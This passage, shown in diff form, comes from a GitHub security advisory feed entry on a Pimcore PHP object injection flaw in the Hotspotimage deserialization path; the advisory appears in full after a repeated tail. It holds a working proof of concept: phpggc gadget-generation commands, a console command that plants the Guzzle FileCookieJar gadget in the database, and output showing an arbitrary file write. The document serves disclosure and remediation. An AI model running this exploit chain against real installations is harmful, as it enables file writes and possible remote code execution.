-<pre><code>=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
-  [negative control] storing benign JSON
-  stored prefix: {"hotspots":[],"marker":[],"crop":[]}
-  json_decode(stored) === null ? false  (=&gt; unserialize fallback)
-=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===
-  target file before load exists? false
-  reloaded class=Pimcore\Model\DataObject\E2eHotspot
-=== RESULT ===
-  [NOT TRIGGERED] target file absent
-</code></pre>
-<p>Captured output — RUN C (negative control, the fix: allowed_classes=false over the same gadget bytes):</p>
-<pre><code>=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
-  stored prefix: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"\GuzzleHttp\
-  json_decode(stored) === null ? true  (=&gt; unserialize fallback)
-=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===
-  target file before load exists? false
-  [negative control] fixed wrapper allowed_classes=false on the same bytes
-  returned type=object class=__PHP_Incomplete_Class
-=== RESULT ===
-  [NOT TRIGGERED] target file absent
-</code></pre>
-<p>RUN A shows the attacker bytes drive <code>unserialize()</code> to instantiate the <code>GuzzleHttp\Cookie\FileCookieJar</code> gadget, whose destructor writes an attacker-controlled file. RUN B shows benign JSON takes the safe <code>json_decode</code> branch (no deserialization, no file). RUN C shows that performing the same deserialization with an <code>allowed_classes</code> allowlist returns an inert <code>__PHP_Incomplete_Class</code> and the gadget never runs — i.e. the proposed fix neutralizes the attack.</p>
-<h2 id="impact">Impact</h2>
-<p>PHP Object Injection (CWE-502) on object load. With gadget chains available in Pimcore's bundled dependencies this is exploitable for remote code execution; the PoC demonstrates an attacker-controlled arbitrary file write via the bundled <code>guzzlehttp/guzzle 7.11.0</code> <code>FileCookieJar</code> chain. Because the <code>*__hotspots</code> column is read on virtually every load of an affected object (admin UI, frontend output, API, inheritance resolution), any write of crafted bytes into that column is reliably executed.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Make <code>Serialize::unserialize()</code> safe by default and/or pass an explicit class allowlist at the Hotspotimage/ImageGallery/Block/Video callers.</p>
-<p>Preferred minimal fix at the wrapper (closes the whole <code>Serialize::unserialize()</code>-without-allowlist family in one place):</p>
-<pre><code class="language-php">public static function unserialize(?string $data = null, array|bool $allowedClasses = false): mixed
-</code></pre>
-<p>(i.e. flip the default to <code>false</code>, requiring callers that legitimately need to revive objects to opt in with an explicit allowlist). Alternatively, change each affected marshaller to pass <code>['allowed_classes' =&gt; false]</code> (or a tight allowlist such as <code>[MarkerHotspotItem::class]</code>) explicitly. RUN C above confirms <code>allowed_classes</code> deserialization renders the gadget inert. Fix PR (private temporary advisory fork): <a href="https://github.com/pimcore/pimcore-ghsa-w23p-wrp7-ch38/pull/1">https://github.com/pimcore/pimcore-ghsa-w23p-wrp7-ch38/pull/1</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-w23p-wrp7-ch38">https://github.com/pimcore/pimcore/security/advisories/GHSA-w23p-wrp7-ch38</a></li>
-<li><a href="https://github.com/pimcore/pimcore/pull/19181">https://github.com/pimcore/pimcore/pull/19181</a></li>
-<li><a href="https://github.com/pimcore/pimcore/commit/b184c01bf11e213e601d965b4e96c8bb7248e980">https://github.com/pimcore/pimcore/commit/b184c01bf11e213e601d965b4e96c8bb7248e980</a></li>
-<li><a href="https://github.com/pimcore/pimcore/releases/tag/v12.3.10">https://github.com/pimcore/pimcore/releases/tag/v12.3.10</a></li>
-<li><a href="https://github.com/pimcore/pimcore/releases/tag/v2026.1.6">https://github.com/pimcore/pimcore/releases/tag/v2026.1.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-w23p-wrp7-ch38">https://github.com/advisories/GHSA-w23p-wrp7-ch38</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w23p-wrp7-ch38</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-08-28T19:13:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore Hotspotimage getDataFromResource() unrestricted Serialize::unserialize over object-store column (PHP Object Injection, CWE-502)]]></title>
-        <id>https://github.com/advisories/GHSA-w23p-wrp7-ch38</id>
-        <link href="https://github.com/advisories/GHSA-w23p-wrp7-ch38"/>
-        <updated>2026-08-28T19:13:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Pimcore\Model\DataObject\ClassDefinition\Data\Hotspotimage::getDataFromResource()</code> deserializes the <code>*__hotspots</code> object-store column through the <code>Pimcore\Tool\Serialize::unserialize()</code> wrapper <strong>without a class allowlist</strong> (the wrapper's <code>$allowedClasses</code> parameter defaults to <code>true</code>, i.e. fully unrestricted). Because the persistence layer always stores this column as PHP-<code>serialize()</code>d bytes, every load of a DataObject that has a Hotspotimage (advanced image) field runs an unrestricted <code>unserialize()</code> over the stored column value. An attacker who can write the <code>*__hotspots</code> store column with crafted serialized bytes achieves PHP Object Injection (CWE-502): arbitrary classes are instantiated and their magic methods (<code>__wakeup</code>/<code>__destruct</code>) execute, which is exploitable for remote code execution via gadget chains present in Pimcore's own bundled dependencies (e.g. <code>guzzlehttp/guzzle</code>).</p>
-<p>The same field-data family also affects the sibling marshallers <code>ImageGallery</code>, <code>Block</code>, and <code>Video</code>, which use the identical <code>json_decode(...) ?: Serialize::unserialize(...)</code> fallback over their respective store columns. The root cause is shared: <code>Serialize::unserialize()</code> defaults to an unrestricted class list, and these callers pass no second argument.</p>
-<h2 id="severity">Severity</h2>
-<p>High. Successful exploitation yields PHP Object Injection leading to remote code execution (proven below as arbitrary file write using a gadget from Pimcore's bundled <code>guzzlehttp/guzzle 7.11.0</code>). This is the deserialization leg of an attack: it requires the ability to write the <code>*__hotspots</code> object-store column with attacker-chosen serialized bytes. No class-allowlist defense is present, so any such write is directly weaponizable on the next object load. CVSS-wise this is comparable to other deserialization sinks over attacker-influenceable storage in this codebase.</p>
-<h2 id="affected-component">Affected component</h2>
-<ul>
-<li>File: <code>models/DataObject/ClassDefinition/Data/Hotspotimage.php</code>, method <code>getDataFromResource()</code>.</li>
-<li>Vulnerable lines (v2026.1.4 / v12.3.8):<pre><code class="language-php">$metaData = $data[$this-&gt;getName() . '__hotspots'];
-// check if the data is JSON (backward compatibility)
-$md = json_decode($metaData, true);
-if (!$md) {
-    $md = Serialize::unserialize($metaData);   // unrestricted: allowed_classes defaults to true
-} elseif (is_array($md)) {
-    $md['hotspots'] = $md;
-}
-</code></pre>
-</li>
-<li>Root enabler: <code>lib/Tool/Serialize.php</code><pre><code class="language-php">public static function unserialize(?string $data = null, array|bool $allowedClasses = true): mixed
-{
-    if ($data === null || $data === '') { return $data; }
-    return unserialize($data, ['allowed_classes' =&gt; $allowedClasses]);  // default true = unrestricted
-}
-</code></pre>
-</li>
-<li>Sibling marshallers with the identical fallback shape: <code>ImageGallery</code>, <code>Block</code>, <code>Video</code> (DataObject\ClassDefinition\Data).</li>
-<li>Package: <code>pimcore/pimcore</code> (Composer).</li>
-<li>Affected versions: all currently maintained releases, including the latest <code>v2026.1.4</code> and <code>v12.3.8</code> (verified against deployed <code>v2026.1.4</code>).</li>
-</ul>
-<h2 id="data-flow">Data flow</h2>
-<ol>
-<li>On save, <code>Hotspotimage::getDataForResource()</code> stores the hotspot/marker/crop metadata as <code>Serialize::serialize($metaData)</code> into the <code>&lt;field&gt;__hotspots</code> object-store column — i.e. PHP serialized bytes, not JSON.</li>
-<li>On load, <code>Hotspotimage::getDataFromResource()</code> reads that column, calls <code>json_decode()</code> (which fails for the serialized format), and therefore falls through to <code>Serialize::unserialize($metaData)</code> with the default unrestricted class list.</li>
-<li><code>Serialize::unserialize()</code> invokes <code>unserialize($data, ['allowed_classes' =&gt; true])</code>, instantiating any class named in the bytes and triggering its magic methods.</li>
-<li>The load path is exercised on essentially every object retrieval (admin grid/detail, frontend rendering, Studio/API reads, inheritance walks) for objects whose class declares a Hotspotimage field, with a non-null <code>&lt;field&gt;__image</code>.</li>
-</ol>
-<p>The attacker primitive is the ability to place crafted serialized bytes into the <code>&lt;field&gt;__hotspots</code> store column (for example through an SQL-write/store-write primitive). The defect is that the deserialization is performed with no class allowlist, so any such write is directly executable.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Verified end-to-end against a real, locally deployed Pimcore <code>v2026.1.4</code> (Composer skeleton + MariaDB + <code>pimcore:install</code>), not a ported stub. The gadget is <code>phpggc Guzzle/FW1</code> built against Pimcore's own bundled <code>guzzlehttp/guzzle 7.11.0</code>; its <code>GuzzleHttp\Cookie\FileCookieJar::__destruct</code> writes an attacker-controlled file to disk (a file-write primitive; the same surface reaches RCE via other vendored gadget chains).</p>
-<p>Gadget generation (476→474 raw bytes, non-JSON so the <code>unserialize</code> fallback is taken):</p>
-<pre><code>printf 'PWNED_BY_DESERIALIZATION_%s' "$(date +%s)" &gt; /tmp/ggc_local_src.txt
-./phpggc Guzzle/FW1 /tmp/pimcore_pwned_hotspot.txt /tmp/ggc_local_src.txt | tr -d '\n' &gt; /tmp/ggc_guzzle_fw1.ser
-# stored bytes begin: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{...
-</code></pre>
-<p>Reproduction harness (a Symfony console command living in the deployed app; it creates a real DataObject class with a Hotspotimage field, a real image asset, a real saved object, performs the attacker store-write into <code>object_store_&lt;id&gt;.img__hotspots</code>, then reloads the object through the real Pimcore model layer):</p>
-<pre><code class="language-php">&lt;?php
-declare(strict_types=1);
-namespace App\Command;
-
-use Pimcore\Db;
-use Pimcore\Model\Asset;
-use Pimcore\Model\DataObject;
-use Pimcore\Model\DataObject\ClassDefinition;
-use Symfony\Component\Console\Attribute\AsCommand;
-use Symfony\Component\Console\Command\Command;
-use Symfony\Component\Console\Input\InputInterface;
-use Symfony\Component\Console\Input\InputOption;
-use Symfony\Component\Console\Output\OutputInterface;
-
-#[AsCommand(name: 'e2e:hotspot', description: 'E2E CWE-502 Hotspotimage __hotspots unserialize')]
-final class E2eHotspotCommand extends Command
-{
-    protected function configure(): void
-    {
-        $this-&gt;addOption('benign', null, InputOption::VALUE_NONE, 'negative control: benign JSON');
-        $this-&gt;addOption('restricted', null, InputOption::VALUE_NONE, 'negative control: allowed_classes=false');
-    }
-
-    protected function execute(InputInterface $input, OutputInterface $output): int
-    {
-        $o = fn (string $m) =&gt; $output-&gt;writeln($m);
-        $gadget = (string) file_get_contents('/tmp/ggc_guzzle_fw1.ser');
-        $target = '/tmp/pimcore_pwned_hotspot.txt';
-        @unlink($target);
-
-        $o('=== STEP 1: create DataObject class with a Hotspotimage field ===');
-        $class = ClassDefinition::getByName('E2eHotspot');
-        if (!$class) {
-            $class = new ClassDefinition();
-            $class-&gt;setName('E2eHotspot');
-            $class-&gt;setGroup('e2e');
-            $field = new ClassDefinition\Data\Hotspotimage();
-            $field-&gt;setName('img');
-            $field-&gt;setTitle('img');
-            $panel = new ClassDefinition\Layout\Panel();
-            $panel-&gt;setName('Layout');
-            $panel-&gt;addChild($field);
-            $class-&gt;setLayoutDefinitions($panel);
-            $class-&gt;save();
-        }
-        $o('  class id=' . $class-&gt;getId());
-
-        $o('=== STEP 2: create image asset (Hotspotimage needs a valid __image id) ===');
-        $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
-        $asset = Asset::getByPath('/e2e_pixel.png');
-        if (!$asset) {
-            $asset = new Asset\Image();
-            $asset-&gt;setFilename('e2e_pixel.png');
-            $asset-&gt;setParent(Asset::getById(1));
-            $asset-&gt;setData($png);
-            $asset-&gt;save();
-        }
-        $o('  asset id=' . $asset-&gt;getId());
-
-        $o('=== STEP 3: create+save object carrying that image ===');
-        $obj = DataObject::getByPath('/e2e_obj');
-        if (!$obj) {
-            $fqcn = '\\Pimcore\\Model\\DataObject\\' . $class-&gt;getName();
-            $obj = new $fqcn();
-            $obj-&gt;setKey('e2e_obj');
-            $obj-&gt;setParent(DataObject::getById(1));
-            $obj-&gt;setPublished(true);
-            $obj-&gt;setValue('img', new DataObject\Data\Hotspotimage($asset));
-            $obj-&gt;save();
-        }
-        $objId = $obj-&gt;getId();
-        $store = 'object_store_' . $class-&gt;getId();
-        $o('  object id=' . $objId . '  store=' . $store);
-
-        $o('=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===');
-        $db = Db::get();
-        $payload = $input-&gt;getOption('benign')
-            ? json_encode(['hotspots' =&gt; [], 'marker' =&gt; [], 'crop' =&gt; []])
-            : $gadget;
-        $db-&gt;executeStatement('UPDATE `' . $store . '` SET `img__hotspots` = ? WHERE oo_id = ?', [$payload, $objId]);
-        $stored = (string) $db-&gt;fetchOne('SELECT `img__hotspots` FROM `' . $store . '` WHERE oo_id = ?', [$objId]);
-        $o('  stored prefix: ' . substr($stored, 0, 60));
-        $o('  json_decode(stored) === null ? ' . var_export(json_decode($stored, true) === null, true) . '  (=&gt; unserialize fallback)');
-
-        $o('=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===');
-        \Pimcore\Cache::clearAll();
-        \Pimcore\Cache\RuntimeCache::clear();
-        $o('  target file before load exists? ' . var_export(file_exists($target), true));
-
-        if ($input-&gt;getOption('restricted')) {
-            $o('  [negative control] fixed wrapper allowed_classes=false on the same bytes');
-            $res = @unserialize($stored, ['allowed_classes' =&gt; false]);
-            $o('  returned type=' . gettype($res) . ' class=' . (is_object($res) ? get_class($res) : 'n/a'));
-            gc_collect_cycles();
-        } else {
-            try {
-                $reloaded = DataObject\Concrete::getById($objId, ['force' =&gt; true]);
-                $reloaded-&gt;getImg(); // triggers Hotspotimage::getDataFromResource() lazy load
-                $o('  reloaded class=' . get_class($reloaded));
-                unset($reloaded);
-            } catch (\Throwable $e) {
-                $o('  (post-unserialize downstream error, gadget already instantiated): ' . $e-&gt;getMessage());
-            }
-            gc_collect_cycles();
-        }
-
-        $o('=== RESULT ===');
-        clearstatcache();
-        if (file_exists($target)) {
-            $o('  [VULNERABLE] gadget file WRITTEN: ' . $target);
-            $o('  contents: ' . trim((string) file_get_contents($target)));
-        } else {
-            $o('  [NOT TRIGGERED] target file absent');
-        }
-        return Command::SUCCESS;
-    }
-}
-</code></pre>
-<p>Captured output — RUN A (positive, gadget):</p>
-<pre><code>=== STEP 1: create DataObject class with a Hotspotimage field ===
-  class id=1
-=== STEP 2: create image asset (Hotspotimage needs a valid __image id) ===
-  asset id=2
-=== STEP 3: create+save object carrying that image ===
-  object id=4  store=object_store_1
-=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
-  stored prefix: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"\GuzzleHttp\
-  json_decode(stored) === null ? true  (=&gt; unserialize fallback)
-=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===
-  target file before load exists? false
-  (post-unserialize downstream error, gadget already instantiated): Cannot use object of type GuzzleHttp\Cookie\FileCookieJar as array
-=== RESULT ===
-  [VULNERABLE] gadget file WRITTEN: /tmp/pimcore_pwned_hotspot.txt
-  contents: [{"Expires":1,"Discard":false,"Value":"PWNED_BY_DESERIALIZATION_1780420803"}]
-</code></pre>
-<p>Captured output — RUN B (negative control, benign JSON in the column):</p>
-<pre><code>=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
-  [negative control] storing benign JSON
-  stored prefix: {"hotspots":[],"marker":[],"crop":[]}
-  json_decode(stored) === null ? false  (=&gt; unserialize fallback)
-=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===
-  target file before load exists? false
-  reloaded class=Pimcore\Model\DataObject\E2eHotspot
-=== RESULT ===
-  [NOT TRIGGERED] target file absent
-</code></pre>
-<p>Captured output — RUN C (negative control, the fix: allowed_classes=false over the same gadget bytes):</p>
-<pre><code>=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
-  stored prefix: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"\GuzzleHttp\
-  json_decode(stored) === null ? true  (=&gt; unserialize fallback)
-=== STEP 5: clear cache + reload object =&gt; getDataFromResource() ===
-  target file before load exists? false
-  [negative control] fixed wrapper allowed_classes=false on the same bytes
-  returned type=object class=__PHP_Incomplete_Class
-=== RESULT ===
-  [NOT TRIGGERED] target file absent
-</code></pre>
-<p>RUN A shows the attacker bytes drive <code>unserialize()</code> to instantiate the <code>GuzzleHttp\Cookie\FileCookieJar</code> gadget, whose destructor writes an attacker-controlled file. RUN B shows benign JSON takes the safe <code>json_decode</code> branch (no deserialization, no file). RUN C shows that performing the same deserialization with an <code>allowed_classes</code> allowlist returns an inert <code>__PHP_Incomplete_Class</code> and the gadget never runs — i.e. the proposed fix neutralizes the attack.</p>
-<h2 id="impact">Impact</h2>
-<p>PHP Object Injection (CWE-502) on object load. With gadget chains available in Pimcore's bundled dependencies this is exploitable for remote code execution; the PoC demonstrates an attacker-controlled arbitrary file write via the bundled <code>guzzlehttp/guzzle 7.11.0</code> <code>FileCookieJar</code> chain. Because the <code>*__hotspots</code> column is read on virtually every load of an affected object (admin UI, frontend output, API, inheritance resolution), any write of crafted bytes into that column is reliably executed.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Make <code>Serialize::unserialize()</code> safe by default and/or pass an explicit class allowlist at the Hotspotimage/ImageGallery/Block/Video callers.</p>
-<p>Preferred minimal fix at the wrapper (closes the whole <code>Serialize::unserialize()</code>-without-allowlist family in one place):</p>
-<pre><code class="language-php">public static function unserialize(?string $data = null, array|bool $allowedClasses = false): mixed
-</code></pre>
-<p>(i.e. flip the default to <code>false</code>, requiring callers that legitimately need to revive objects to opt in with an explicit allowlist). Alternatively, change each affected marshaller to pass <code>['allowed_classes' =&gt; false]</code> (or a tight allowlist such as <code>[MarkerHotspotItem::class]</code>) explicitly. RUN C above confirms <code>allowed_classes</code> deserialization renders the gadget inert. Fix PR (private temporary advisory fork): <a href="https://github.com/pimcore/pimcore-ghsa-w23p-wrp7-ch38/pull/1">https://github.com/pimcore/pimcore-ghsa-w23p-wrp7-ch38/pull/1</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-w23p-wrp7-ch38">https://github.com/pimcore/pimcore/security/advisories/GHSA-w23p-wrp7-ch38</a></li>
-<li><a href="https://github.com/pimcore/pimcore/pull/19181">https://github.com/pimcore/pimcore/pull/19181</a></li>
-<li><a href="https://github.com/pimcore/pimcore/commit/b184c01bf11e213e601d965b4e96c8bb7248e980">https://github.com/pimcore/pimcore/commit/b184c01bf11e213e601d965b4e96c8bb7248e980</a></li>
-<li><a href="https://github.com/pimcore/pimcore/releases/tag/v12.3.10">https://github.com/pimcore/pimcore/releases/tag/v12.3.10</a></li>
-<li><a href="https://github.com/pimcore/pimcore/releases/tag/v2026.1.6">https://github.com/pimcore/pimcore/releases/tag/v2026.1.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-w23p-wrp7-ch38">https://github.com/advisories/GHSA-w23p-wrp7-ch38</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w23p-wrp7-ch38</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-08-28T19:13:25.000Z</published>
     </entry>
 </feed>
